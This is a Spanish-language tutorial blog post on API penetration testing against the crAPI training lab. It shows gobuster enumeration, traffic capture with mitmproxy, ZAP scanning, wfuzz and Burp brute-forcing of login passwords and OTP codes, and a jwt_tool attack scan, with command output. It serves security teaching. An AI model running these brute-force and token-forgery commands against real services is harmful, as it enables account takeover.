---
date: 2023-12-08T06:50:05.000Z
layout: post
comments: true
title: API Hacking
subtitle: 'vulnerabilidades de OWASP'
description: >-
image: >-
    /images/apiimage.png
optimized_image: >-
    /images/apiimage.png
category: ciberseguridad
tags: 
  - hacking
  - owasp
  - exposure
  - broken
  - object
  - level
  - function
  - misconfiguration
  - injection
  - ssrf
  - sql
  - nosql
  - mass
  - assignment
  - zap
  - jwt_tool
  - jwt
author: Felipe Canales Cayuqueo
paginate: true
---

Una API, o Interfaz de Programación de Aplicaciones (del inglés, Application Programming Interface), es un conjunto de reglas, protocolos y herramientas para construir software y aplicaciones. Actúa como un intermediario que permite que dos aplicaciones diferentes se comuniquen entre sí. En otras palabras, una API es una forma en que diferentes programas y servicios pueden interactuar y compartir datos y funcionalidades de manera estructurada.

### Enumeración de directorios

Gobuster nos permite descubrir recursos ocultos y posibles vectores de ataque en un sitio web. Iniciamos con el directorio raíz del sitio `http://crapi.com:8888`. Aquí, probando nombres de la wordlist en busca de directorios ocultos.

```bash
┌─[root@kali]─[/home/user/api]
└──╼ gobuster dir -u http://crapi.com:8888 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 -b 404 -k --no-error --exclude-length 2835 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crapi.com:8888
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2835
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 00:14:41 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 175] [--> http://crapi.com/images/]
/community            (Status: 301) [Size: 175] [--> http://crapi.com/community/]
/identity             (Status: 301) [Size: 175] [--> http://crapi.com/identity/]
/workshop             (Status: 301) [Size: 175] [--> http://crapi.com/workshop/]
Progress: 220404 / 220561 (99.93%)
===============================================================
2023/06/18 00:16:04 Finished
===============================================================
                                                                  
```

Descubrimos varios directorios como `/images`, `/community`, `/identity` y `/workshop`. Estos directorios nos dan pistas sobre la estructura y los contenidos del sitio.

```bash
┌─[root@kali]─[/home/user/api]
└──╼ gobuster dir -u http://crapi.com:8888/community -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 -b 404 -k --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crapi.com:8888/community
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2835
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 00:19:44 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 28]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /community/http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /community/http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /community/http:/blogs]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /community/http:/blog]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /community/%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /community/http:/community]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /community/http:/radar]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /community/http:/jeremiahgrossman]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /community/http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /community/http:/swik]
Progress: 220560 / 220561 (100.00%)
===============================================================
2023/06/18 00:23:42 Finished
===============================================================

                                                                  
```


```bash
┌─[root@kali]─[/home/user/api]
└──╼ gobuster dir -u http://crapi.com:8888/identity -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 -b 404,500 -k --no-error --exclude-length 30  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crapi.com:8888/identity
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,500
[+] Exclude Length:          30
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 00:21:02 Starting gobuster in directory enumeration mode
===============================================================
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 435]
/http%3A%2F%2Fblog    (Status: 400) [Size: 435]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 435]
/External%5CX-News    (Status: 400) [Size: 435]
/health_check         (Status: 200) [Size: 31]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 435]
/http%3A%2F%2Fradar   (Status: 400) [Size: 435]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 435]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 435]
/http%3A%2F%2Fswik    (Status: 400) [Size: 435]
Progress: 220281 / 220561 (99.87%)
===============================================================
2023/06/18 00:26:02 Finished
===============================================================

                                                                  
```


```bash
┌─[root@kali]─[/home/user/api]
└──╼ gobuster dir -u http://crapi.com:8888/workshop -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 -b 404,500 -k --no-error
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crapi.com:8888/workshop
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,500
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/18 00:38:26 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /workshop/admin/]
/health_check         (Status: 301) [Size: 0] [--> /workshop/health_check/]
Progress: 220561 / 220561 (100.00%)
===============================================================
2023/06/18 01:49:02 Finished
===============================================================
                                                                  
```


### Reconocimiento por navegador (Excessive Data Exposure)

Podemos monitorear el tráfico de red a través del navegador utilizando la pestaña "Network" o "Red" en la herramienta de inspección de elementos. En este contexto, tras iniciar sesión, el tráfico de red puede ser observado de la siguiente manera:

[![apinetwork](/images/apinetwork.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apinetwork.png)

[![api1capture](/images/api1capture.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api1capture.png)

Es posible visualizar el token de autorización:

[![api3capture](/images/api3capture.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api3capture.png)

Si navegamos a la sección "Preview", podemos ver el contenido proporcionado por la API:

[![api2capture](/images/api2capture.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api2capture.png)

A medida que exploramos los distintos enlaces en la página web, podremos ver cómo se registran distintas solicitudes:

[![api4capture](/images/api4capture.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api4capture.png)

Al indagar un poco más, podemos detectar una vulnerabilidad tipo "API3:2019 - Excessive Data Exposure". Esta vulnerabilidad se evidencia al observar que toda la información del usuario que comenta en el foro es visible, a pesar de que no se muestra en el back-end.

[![api5capture](/images/api5capture.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/api5capture.png)


### Documentación automatizada

```mitmweb``` es una interfaz web para mitmproxy, una herramienta de línea de comandos utilizada para interceptar, inspeccionar, modificar y reproducir solicitudes y respuestas HTTP(S). El nombre mitmproxy es la abreviatura de Man-In-The-Middle proxy. Por medio del siguiente comando se creará un oyente proxy usando el puerto 8080. Luego puede abrir un navegador y usar FoxyProxy para enviar su navegador al puerto 8080 usando la misma que ocupa Burp Suite.

[![apifoxyproxyadd](/images/apifoxyproxyadd.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apifoxyproxyadd.png)


```bash
┌─[root@kali]─[/home/user/api]
└──╼ mitmweb                                                                                                              
[03:11:08.187] HTTP(S) proxy listening at *:8080.
[03:11:08.188] Web server listening at http://127.0.0.1:8081/
[497773:497799:0618/031109.810870:ERROR:bus.cc(399)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
[497773:497799:0618/031109.811215:ERROR:bus.cc(399)] Failed to connect to the bus: Could not parse server address: Unknown address type (examples of valid types are "tcp" and on UNIX "unix")
Opening in existing browser session.
                                                                  
```


[![apimitmweb](/images/apimitmweb.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimitmweb.png)

[![apimitmproxy](/images/apimitmproxy.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimitmproxy.png)

Una vez seleccionamos el proxy usando el puerto 8080 comenzará a capturar todo el tráfico, en que por medio del parámetro ```~d``` y el dominio respectivo podremos filtrar para visualizar lo obtenido.

[![apimitmfilter](/images/apimitmfilter.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimitmfilter.png)

Al seleccionar  Guardar se creará un archivo llamado flujos. Podemos usar el archivo de "flujos" para crear nuestra propia documentación de API. Usando una herramienta llamada ```mitmproxy2swagger```, podremos transformar nuestro tráfico capturado en un archivo YAML de API abierta 3.0.

[![apimitmsave](/images/apimitmsave.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apimitmsave.png)

```bash
┌─[root@kali]─[/home/user/api]
└──╼ mitmproxy2swagger -i flows -o spec.yml -p http://crapi.com:8888 -f flow
No existing swagger file found. Creating new one.
[▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌] 100.0%Done!
                                                           
```

Al realizar este proceso debemos editar el archivo "spec.yml" y eliminar el prefijo de ```ignore:``` en aquellas direcciones que se consideran importantes para la detección de vulnerabilidades, para este caso quitaremos ```ignore:``` de todas las direcciones que tengan que ver con la API.

```bash
┌─[root@kali]─[/home/user/api]
└──╼ nano spec.yml
openapi: 3.0.0
info:
  title: flows Mitmproxy2Swagger
  version: 1.0.0
servers:
- url: http://crapi.com:8888
  description: The default server
paths: {}
x-path-templates:
# Remove the ignore: prefix to generate an endpoint with its URL
# Lines that are closer to the top take precedence, the matching is greedy
- /community/api/v2/community/posts
- /community/api/v2/community/posts/PcCwNkGwRiN9qeJ8JwFzYU
- /community/api/v2/community/posts/PcCwNkGwRiN9qeJ8JwFzYU/comment
- /community/api/v2/community/posts/aRQMoSn66SieMUqHxjKqr9
- /community/api/v2/community/posts/aRQMoSn66SieMUqHxjKqr9/comment
- /community/api/v2/community/posts/recent
- /community/api/v2/coupon/validate-coupon
- ignore:/favicon.ico
- /identity/api/auth/forget-password
- /identity/api/auth/login
- /identity/api/auth/signup
- /identity/api/auth/v3/check-otp
- /identity/api/v2/user/change-email
- /identity/api/v2/user/dashboard
- /identity/api/v2/user/pictures
- /identity/api/v2/user/reset-password
- /identity/api/v2/user/videos
- /identity/api/v2/vehicle/resend_email
- /identity/api/v2/vehicle/vehicles
- ignore:/images/seat.svg
- ignore:/images/wheel.svg
- ignore:/static/media/default_profile_pic.24d66af2.png
- /workshop/api/shop/orders
- /workshop/api/shop/orders/{id}
- /workshop/api/shop/orders/1
- /workshop/api/shop/orders/2
- /workshop/api/shop/orders/3
- /workshop/api/shop/orders/4
- /workshop/api/shop/orders/all
- /workshop/api/shop/orders/return_order
- /workshop/api/shop/products
- /workshop/api/shop/return_qr_code
```

Guarde el archivo spec.yml actualizado y vuelva a ejecutar mitmproxy2swagger. Esta vez, agregue el indicador "--examples" para mejorar la documentación de su API.

```bash
┌─[root@kali]─[/home/user/api]
└──╼ mitmproxy2swagger -i flows -o spec.yml -p http://crapi.com:8888 -f flow --examples
[▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌▌] 100.0%Done!

```

Una vez que tenemos esta información, podemos visualizar los datos obtenidos importándolos en [Swagger Editor](https://editor.swagger.io/) o bien visualizarlos para realizar pruebas a través de ```Postman```.


```bash
┌─[user@kali]─[/home/user/api]
└──╼ postman               
```


[![apipostmanimport](/images/apipostmanimport.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmanimport.png)

Subimos el archivo spec.yml e importamos en OpenAPI 3.0.

[![apipostmanfileupload](/images/apipostmanfileupload.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmanfileupload.png)
[![apipostmanuploadspec](/images/apipostmanuploadspec.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmanuploadspec.png)
[![apipostmanimportv3](/images/apipostmanimportv3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmanimportv3.png)


### Excessive Data Exposure por Postman

Una vez ya se encuentra importado el contenido, damos en editar en los tres puntos.

[![apipostmanedit](/images/apipostmanedit.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmanedit.png)

Se extrae el Token como se vió en un principio en la pestaña de "Network".

[![apitoken](/images/apitoken.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apitoken.png)

En "Authorization" seleccionamos "Bearer Token" para pegar en ese lugar el Token correspondiente para realizar las consultas. También podemos dejar en un principio sin Token para ir probando algún acceso sin necesidad de autenticación.

[![apipostmantoken](/images/apipostmantoken.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmantoken.png)

Si le damos a "Send" podremos visualizar la respuesta que en este caso se aprecia la vulnerabilidad "Excessive Data Exposure" mostrada anteriormente.

[![apipostmandataleak](/images/apipostmandataleak.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apipostmandataleak.png)



### Detección de vulnerabilidades con OWASP ZAP

OWASP ZAP (Open Web Application Security Project Zed Attack Proxy) es una herramienta de código abierto diseñada para ayudar en la identificación de vulnerabilidades de seguridad en aplicaciones web. Una vez ya tenemos el archivo "spec.yml" podemos usarlo para importarlo en OWASP ZAP de la siguiente forma:

[![apizapimport](/images/apizapimport.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapimport.png)
[![apizapimport2](/images/apizapimport2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapimport2.png)

Una vez se realiza este proceso, se podrá visualizar el contenido en "Sites" y nos mostrará las primeras vulnerabilidades detectadas.

[![apizapfirstalerts](/images/apizapfirstalerts.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapfirstalerts.png)

Otra forma es navegando manualmente, introduciendo las credenciales para su uso.

[![apizapmanualexplore](/images/apizapmanualexplore.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapmanualexplore.png)
[![apizaplogin](/images/apizaplogin.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizaplogin.png)


Y finalmente realizamos un escaneo activo:

[![apizapcontext9](/images/apizapcontext9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext9.png)
[![apizapcontext10](/images/apizapcontext10.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext10.png)

En caso de no funcionar bien la autenticación, se debe realizar los siguientes procedimientos:

1. En la pestaña de autenticación detectar las credenciales y darle click derecho para luego dirigirse a "Include in Context" y crear un nuevo contexto.

[![apizapcontext](/images/apizapcontext.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext.png)

2. En las propiedades buscamos la opción de autenticación y seleccionamos el nodo de las credenciales.

[![apizapcontext2](/images/apizapcontext2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext2.png)
[![apizapcontext3](/images/apizapcontext3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext3.png)

3. En algunos casos es posible detectar un mensaje que se entrega al cerrar sesión, para hacer entender a OWASP ZAP cuando sale de la sesión.

[![apizapcontext3.1](/images/apizapcontext3.1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext3.1.png)

4. Luego nos dirigimos a "Users" y añadimos el usuario y contraseña.

[![apizapcontext4](/images/apizapcontext4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext4.png)

5. Asignamos la configuración en "Flag as Context".

[![apizapcontext5](/images/apizapcontext5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext5.png)

6. Forzamos que siempre tenga que estar autenticado.

[![apizapcontext6](/images/apizapcontext6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext6.png)

7. Ejecutamos el escaneo activo.

[![apizapcontext7](/images/apizapcontext7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext7.png)
[![apizapcontext8](/images/apizapcontext8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apizapcontext8.png)


### Fuerza bruta para tomar control de cuentas (Account Takeover (ATO))

Primero podemos aprovechar la vulnerabilidad de exceso de información para obtener correos electrónicos válidos:

[![apibrutepassword1](/images/apibrutepassword1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword1.png)

Estos resultados los podemos guardar en un archivo que se llama "response.json" y extraeremos solo los correos válidos de la siguiente forma:

[![apibrutepassword2](/images/apibrutepassword2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword2.png)

```bash
┌─[root@kali]─[/home/user/api]
└──╼ grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json | uniq | sort -u  > users.txt                
```

```bash
┌─[root@kali]─[/home/user/api]
└──╼ cat users.txt
a@a.com
test@test.com
vuln@brute.com
```

Realizamos fuerza bruta de la siguiente forma con ```wfuzz```:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -d '{"email":"FUZZ","password":"FUZ2Z"}' -H 'Content-Type: application/json' -w users.txt -w wordlist.txt -u http://crapi.com:8888/identity/api/auth/login --hc 404,500,405,504,401             
```

La otra opción es realizar fuerza bruta sobre un usuario en concreto:

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -d '{"email":"vuln@brute.com","password":"FUZZ"}' -H 'Content-Type: application/json' -w wordlist.txt -u http://crapi.com:8888/identity/api/auth/login --hc 404,500,405,504,401  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crapi.com:8888/identity/api/auth/login
Total requests: 272

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000228:   200        0 L      1 W        503 Ch      "P@ssword1"                                                                                                                                                                 

Total time: 0
Processed Requests: 272
Filtered Requests: 271
Requests/sec.: 0

```

También es posible usar BurpSuite interceptando la petición en el momento de iniciar sesión:

[![apibrutepassword3](/images/apibrutepassword3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword3.png)

Luego esta petición se envía al ```intruder``` para realizar un ataque de "Cluster Bomb" y seleccionar los parámetros de email y password.

[![apibrutepassword4](/images/apibrutepassword4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword4.png)

Seleccionamos los diccionarios correspondientes para cada payload e iniciamos el ataque:

[![apibrutepassword5](/images/apibrutepassword5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword5.png)
[![apibrutepassword6](/images/apibrutepassword6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword6.png)
[![apibrutepassword7](/images/apibrutepassword7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword7.png)

En las respuestas aparece un código de estado 200 que contiene JWT y confirma con éxito la fuerza bruta:

[![apibrutepassword8](/images/apibrutepassword8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apibrutepassword8.png)


### Fuerza Bruta a 2FA (otp)

La autenticación de dos factores (2FA), especialmente mediante el uso de One-Time Passwords (OTP), es un método de seguridad avanzado donde se requieren dos formas de identificación distintas para acceder a una cuenta o servicio. Los OTPs son códigos que se generan para una sola sesión o transacción, añadiendo una capa adicional de seguridad al proceso de autenticación. Sin embargo, los sistemas basados en OTP pueden ser vulnerables a ataques de fuerza bruta, donde un atacante intenta sistemáticamente adivinar el código correcto. Herramientas como ```wfuzz``` permiten probar la resistencia de estos sistemas contra ataques de fuerza bruta, mediante la generación y prueba rápida de múltiples combinaciones de OTP.

```bash
┌─[root@kali]─[/home/user/api]
└──╼ wfuzz -d '{"email":"test@test.com","otp":"FUZZ","password":"joA8Za*owFGeXZZr"}' -H 'Content-Type: application/json' -w /usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt -u http://crapi.io/identity/api/auth/v3/check-otp --hc 500,404
```

### JWT análisis

Para realizar un análisis de referencia de un JWT, simplemente use jwt_tool junto con su JWT capturado para ver información similar al depurador de JWT. 

[![apijwttool1](/images/apijwttool1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/apijwttool1.png)


```bash
┌─[root@kali]─[/home/user/api]
└──╼ ./jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2dWxuQGJydXRlLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg3MjEwMzU3LCJleHAiOjE2ODc4MTUxNTd9.lu39XgPyOc6t_kap50ut4cPMQfNl3jAOxFNL7jOJV1PjzZ1iltN0haXRnqWAiwNlPmHLgpWF8C4htxp-fU2Qflmzh8tswVv2yJC_Wg_Z3nLkLjyUD2nFlPO9HNNksrAGpH65bYtU9T-4UoKCfn5IrLCFLqUkT0wxE7sxVBMjkfq3whA1NYYN0DGS2CIZNppAREpO9VjMN639yZdnmZgV9BP4VEEF9qQ9T8KJmJYGZ_fRpGqGCMe5wc1nJybqZiA9qWL6tnNJFv0AtX7BPqRGAeUojAWtQBfjm2zwY09Fr_2eEi8QOWNoq8onVra2HnKpOMPokn25IJtJwhBrSrm9nw                                                                                                                                                                                                        

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"

Token payload values:
[+] sub = "vuln@brute.com"
[+] role = "user"
[+] iat = 1687210357    ==> TIMESTAMP = 2023-06-19 17:32:37 (UTC)
[+] exp = 1687815157    ==> TIMESTAMP = 2023-06-26 17:32:37 (UTC)

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 7 days, 0 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
               
```

Además, jwt_tool tiene un "Escaneo de libro de jugadas" que se puede usar para apuntar a una aplicación web y escanear en busca de vulnerabilidades comunes de JWT. 

```bash
┌─[root@kali]─[/home/user/api]
└──╼ ./jwt_tool.py -t http://crapi.com:8888/identity/api/v2/user/dashboard -rh "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2dWxuQGJydXRlLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg3MjEwMzU3LCJleHAiOjE2ODc4MTUxNTd9.lu39XgPyOc6t_kap50ut4cPMQfNl3jAOxFNL7jOJV1PjzZ1iltN0haXRnqWAiwNlPmHLgpWF8C4htxp-fU2Qflmzh8tswVv2yJC_Wg_Z3nLkLjyUD2nFlPO9HNNksrAGpH65bYtU9T-4UoKCfn5IrLCFLqUkT0wxE7sxVBMjkfq3whA1NYYN0DGS2CIZNppAREpO9VjMN639yZdnmZgV9BP4VEEF9qQ9T8KJmJYGZ_fRpGqGCMe5wc1nJybqZiA9qWL6tnNJFv0AtX7BPqRGAeUojAWtQBfjm2zwY09Fr_2eEi8QOWNoq8onVra2HnKpOMPokn25IJtJwhBrSrm9nw" -M pb

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2dWxuQGJydXRlLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjg3MjEwMzU3LCJleHAiOjE2ODc4MTUxNTd9.lu39XgPyOc6t_kap50ut4cPMQfNl3jAOxFNL7jOJV1PjzZ1iltN0haXRnqWAiwNlPmHLgpWF8C4htxp-fU2Qflmzh8tswVv2yJC_Wg_Z3nLkLjyUD2nFlPO9HNNksrAGpH65bYtU9T-4UoKCfn5IrLCFLqUkT0wxE7sxVBMjkfq3whA1NYYN0DGS2CIZNppAREpO9VjMN639yZdnmZgV9BP4VEEF9qQ9T8KJmJYGZ_fRpGqGCMe5wc1nJybqZiA9qWL6tnNJFv0AtX7BPqRGAeUojAWtQBfjm2zwY09Fr_2eEi8QOWNoq8onVra2HnKpOMPokn25IJtJwhBrSrm9nw

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"

Token payload values:
[+] sub = "vuln@brute.com"
[+] role = "user"
[+] iat = 1687210357    ==> TIMESTAMP = 2023-06-19 17:32:37 (UTC)
[+] exp = 1687815157    ==> TIMESTAMP = 2023-06-26 17:32:37 (UTC)

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 7 days, 0 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

[+] Sending token
HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability
jwttool_9b545ef791bafec1944117609587edef Sending token Response Code: 200, 183 bytes
Running Scanning Module:
Running prescan checks...
jwttool_d2f42928d068e76bfdb194c1878acdb0 Prescan: original token Response Code: 200, 183 bytes
jwttool_9eaa9c5d73ebd3d30b4ddff9718f3e61 Prescan: no token Response Code: 404, 58 bytes
jwttool_fede97d0461d058f65638ffcb0ff51d6 Prescan: Broken signature Response Code: 200, 183 bytes
jwttool_4601d29d02c1e1b4b130411af27a62e5 Prescan: repeat original token Response Code: 200, 183 bytes

LAUNCHING SCAN: JWT Attack Playbook
jwttool_fede97d0461d058f65638ffcb0ff51d6 Broken signature Response Code: 200, 183 bytes
jwttool_4601d29d02c1e1b4b130411af27a62e5 Persistence check 1 (should always be valid) Response Code: 200, 183 bytes
jwttool_91b7097f91fbb6d5fadbafdfeaff5503 Claim processing check in sub claim Response Code: 404, 58 bytes
jwttool_3c997fb1f947918705c75167ac2f8d57 Claim processing check in role claim Response Code: 200, 183 bytes
jwttool_545a2e3bae7be053f59e759aaa3d5dc3 Claim processing check in iat claim Response Code: 404, 58 bytes
jwttool_34db010197d1494f70a702d6560408b9 Claim processing check in exp claim Response Code: 404, 58 bytes
jwttool_4601d29d02c1e1b4b130411af27a62e5 Persistence check 2 (should always be valid) Response Code: 200, 183 bytes
jwttool_a9e3d385b5ae5f0d3ccc370dd8e5fb58 Exploit: Blank password accepted in signature (-X b) Response Code: 200, 183 bytes
jwttool_18eff8781206a5802cd918194ea26d2b Exploit: Null signature (-X n) Response Code: 404, 58 bytes
jwttool_83d9286c4bb2a29630123d885a90f5cb Exploit: "alg":"none" (-X a) Response Code: 200, 183 bytes
jwttool_eb1c053070ec208da14a7cc93a86a878 Exploit: "alg":"None" (-X a) Response Code: 404, 58 bytes
jwttool_f5cc332ddadba6b7728ae7608805495c Exploit: "alg":"NONE" (-X a) Response Code: 404, 58 bytes
jwttool_84844f61d8d5e6b0da931427d11e76fc Exploit: "alg":"nOnE" (-X a) Response Code: 404, 58 bytes
File loaded: /root/.jwt_tool/jwttool_custom_public_RSA.pem
jwttool_4cb7193ec1d3ed422543da4e4a15dcd2 Exploit: RSA Key Confusion Exploit (provided Public Key) Response Code: 200, 183 bytes
key: /root/.jwt_tool/jwttool_custom_private_RSA.pem
jwttool_48bfd14a3a506eea67df16354d89a918 Exploit: Injected JWKS (-X i) Response Code: 200, 183 bytes
jwttool_5fbfee561367c71a33ff03dcc461daf4 Exploit: Spoof JWKS (-X s) Response Code: 200, 183 bytes
